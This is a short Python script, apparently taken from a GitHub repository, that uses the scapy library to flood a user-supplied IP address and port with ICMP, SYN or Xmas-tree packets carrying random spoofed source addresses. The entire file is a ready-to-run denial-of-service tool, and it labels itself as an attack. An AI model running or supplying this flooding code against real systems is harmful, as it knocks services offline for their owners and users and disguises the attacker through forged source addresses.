#!/usr/bin/python3
#@EmreOvunc
#@0x00
#Source - https://github.com/EmreOvunc/Icmp-Syn-Flood
#Requirements - pip3 install scapy
from scapy.all import *
import random


def main():
    user_input = input("Please select one of the attack type [syn, icmp, xmas]: ")
    if user_input == "icmp":
        icmpflood()
    elif user_input == "syn":
        synflood()
    elif user_input == "xmas":
        xmasflood()
    else:
        print("[ERROR] Select one of the attack type !!!")
        main()


def icmpflood():
    target = destinationIP()
    cycle = input("How many packets do you want to send? [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range (0, int(cycle)):
        send(IP(dst=target, src=RandIP())/ICMP())


def synflood():
    target = destinationIP()
    targetPort = destinationPort()
    cycle = input("How many packets do you want to send? [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range(0, int(cycle)):
        send(IP(dst=target, src=RandIP())/TCP(dport=targetPort,
                                              flags="S",
                                              seq=RandShort(),
                                              ack=RandShort(),
                                              sport=RandShort()))

def xmasflood():
    target = destinationIP()
    targetPort = destinationPort()
    cycle = input("How many packets do you want to send? [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range(0, int(cycle)):
        send(IP(dst=target, src=RandIP())/TCP(dport=targetPort,
                                              flags="FSRPAUEC",
                                              seq=RandShort(),
                                              ack=RandShort(),
                                              sport=RandShort()))


def destinationIP():
    dstIP = input("Destination IP: ")
    return dstIP


def destinationPort():
    dstPort = input("Destination Port: ")
    return int(dstPort)


main()

